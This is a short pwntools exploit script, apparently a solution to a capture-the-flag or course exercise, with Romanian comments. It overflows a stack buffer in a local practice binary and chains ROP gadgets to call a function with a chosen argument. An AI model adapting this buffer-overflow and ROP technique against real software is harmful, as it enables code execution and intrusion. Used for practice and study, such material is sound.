#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

io = process('./bin/ex2')

OFFSET    = 72
RET       = 0x401016                  # ret
POP_RDI   = 0x40125d                  # pop rdi ; pop rbp ; ret
DREAMMSG  = 0x401166                  # void dream_msg(char*)
SOULDREAM = 0x404060                  # char souldream[256] global
LANDING   = 0x401352                


io.recvuntil(b"What is your dream?")

payload  = b"A"*OFFSET
payload += p64(RET)                        # aliniere 16B
payload += p64(POP_RDI) + p64(SOULDREAM)   # RDI = &souldream (fără 0x20 în bytes)
payload += p64(0xDEADBEEFCAFEBABE)         # junk pt pop rbp
payload += p64(DREAMMSG)                   # call dream_msg(RDI)
payload += p64(LANDING)                    # adresă validă de continuare după ret

io.sendline(payload)
io.interactive()
